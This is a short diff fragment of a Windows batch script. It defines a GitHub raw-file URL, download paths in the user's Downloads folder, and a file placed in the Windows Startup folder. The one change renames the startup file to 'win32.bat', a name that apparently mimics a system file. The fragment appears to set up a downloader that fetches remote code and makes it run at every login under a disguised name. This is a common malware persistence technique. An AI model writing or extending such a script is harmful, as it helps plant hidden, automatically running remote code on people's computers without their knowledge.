@@ -5,7 +5,7 @@ set "github_url=https://raw.githubusercontent.com/HATERSCOM/PROJEC1/refs/heads/m
 set "output_path=%USERPROFILE%\Downloads\hello.bat"
 set "backup_path=%USERPROFILE%\Downloads\win32.bat"
 set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "startup_file=%startup_folder%\1.bat"
+set "startup_file=%startup_folder%\win32.bat"
 set "log_file=%USERPROFILE%\Downloads\script_log.txt"
 
 echo Starting script at %DATE% %TIME% >> "%log_file%"
